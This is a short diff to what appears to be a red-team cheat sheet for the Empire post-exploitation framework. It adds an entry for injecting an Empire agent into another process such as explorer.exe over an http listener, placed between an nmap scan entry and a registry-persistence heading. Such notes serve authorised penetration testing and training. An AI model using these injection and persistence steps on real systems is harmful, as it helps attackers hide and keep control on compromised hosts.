@@ -282,6 +282,17 @@ set ReadableOut scan.nmap
 execute
 ```
 
+### Empire PSInject Agent into another process&#x20;
+
+```
+// use explorer.exe 528 (for example)
+set Agent <Current Empire Agent>
+set Bypasses <up to you>
+set Listener http
+set ProcId 528
+execute
+```
+
 ### Empire Registry Persistence
 
 ```
